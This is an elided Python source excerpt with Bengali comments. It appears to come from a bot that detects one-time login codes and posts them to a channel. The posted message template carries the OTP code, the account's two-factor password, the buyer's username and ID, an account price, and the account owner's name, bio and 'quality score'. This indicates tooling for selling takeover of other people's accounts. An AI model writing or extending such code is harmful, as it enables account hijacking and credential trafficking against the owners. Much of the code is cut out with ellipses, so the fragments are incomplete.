...
class ChannelPoster:
    ...
    # কতটুকু শুরুতে ও শেষে রাখবো ঠিক করি
        if length <= 8:
            start, end = 3, 2
        else:
            start, end = 7, 3
    
    # যদি start + end length-এর চেয়ে বড় হয় (ওভারল্যাপ হয়), তাহলে start কমিয়ে দেই
        if start + end > length:
            start = length - end
    
        return phone[:start] + "****" + phone[-end:]
    ...
    async def post_otp(self, config: dict, data: dict):
        ...
        if data.get("last_name"):
            display_name += f" {data['last_name'][0]}."
        if not display_name:
        ...
        # Verification
        verified_icon = "✅" if data.get("is_verified") else "❌"
        business_icon = "🏢" if data.get("is_business") else ""

        # Quality score
        quality = data.get("quality_score")
        quality_bar = "🟢" if quality and quality >= 70 else "🟡" if quality and quality >= 40 else "🔴"
...
• Business: {business_icon or "No"}
• Quality: {quality_str} {quality_bar}
• Bio: {bio or "—"}
...
━━━━━━━━━━━━━━━━━━━
✅ **Tap on the code to copy**
━━━━━━━━━━━━━━━━━━━

_🤖 24/7 OTP Detection Server!_
"""
...
🔐 **OTP Code:** `{otp_code}`
🔑 **2FA Password:** `{data.get('two_fa_password', 'N/A')}`
👤 **Buyer:** {buyer_username} (ID: {buyer_id})
📱 **Endpoint:** {endpoint_name}
💰 **Price:** {account_price}
🛡️ **Spam:** {spam_status}

👤 **Account Owner:** {display_name} {username}
📊 **Quality:** {quality_str} | Age: {age_str}
✅ Verified: {verified_icon} | Business: {business_icon or "No"}
    ...
    async def _handle_detection(self, session_id: str, otp_code: str):
        ...
        try:
            ...
            await self.poster.post_otp({
                ...
                "account_age_days": session_info.get("account_age_days"),
                "profile_pic_url": session_info.get("profile_pic_url"),
                "bio": session_info.get("bio"),
                "is_verified": session_info.get("is_verified"),
                "is_business": session_info.get("is_business"),
                "last_active": session_info.get("last_active"),
                "quality_score": session_info.get("quality_score"),
                "two_fa_password": session_info.get("two_fa_password")
            })
